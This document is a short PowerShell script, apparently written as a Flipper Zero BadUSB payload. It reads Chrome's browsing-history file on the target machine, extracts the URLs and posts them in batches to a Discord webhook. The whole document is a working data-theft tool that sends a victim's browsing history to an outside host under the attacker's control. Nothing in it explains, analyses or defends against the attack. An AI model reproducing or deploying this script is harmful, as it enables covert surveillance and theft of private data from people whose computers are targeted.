###############
Powershell Script to retrieve Chrome browsing history and send it via webhook to your own discord server.
Technically for use in Flipper Zero BadUSB
6/17/2023
-JW
################


$filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\history"
$maxMsgs = 20 # Maximum number of messages to send to Discord

# Check if the file exists
if (!(Test-Path $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

# Read the file contents
$fileContents = Get-Content -Path $filePath

# Extract URLs using regular expressions
$urlPattern = 'https?://(?:[-\w]+\.)+[a-zA-Z]{2,9}(?:/[-\w]+)*'
$urls = $fileContents | Select-String -Pattern $urlPattern -AllMatches | Foreach-Object { $_.Matches.Value }

# Prepare messages with maximum character limit
$messages = @()
$currentMessage = ""
foreach ($url in $urls) {
    $newContent = $currentMessage + "`n" + $url
    if ($newContent.Length -gt 1800) {
        $messages += $currentMessage
        $currentMessage = $url
    } else {
        $currentMessage = $newContent
    }
}
# Add the last message
$messages += $currentMessage

$totalMessages = [Math]::Min($messages.Count, $maxMsgs)
$currentMessageNumber = 1

# Send each message to Discord webhook with a delay of 0.5 seconds
foreach ($message in $messages) {
    $content = "Message $currentMessageNumber of $totalMessages`n$message"

    $body = @{
        "content" = $content
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $endpoint -Method Post -ContentType "application/json" -Body $body

    Start-Sleep -Milliseconds 500  # Delay for 0.5 seconds

    $currentMessageNumber++

    if ($currentMessageNumber -gt $maxMsgs) {
        break
    }
}

# Display success message
Write-Host "URLs sent successfully to the Discord webhook."
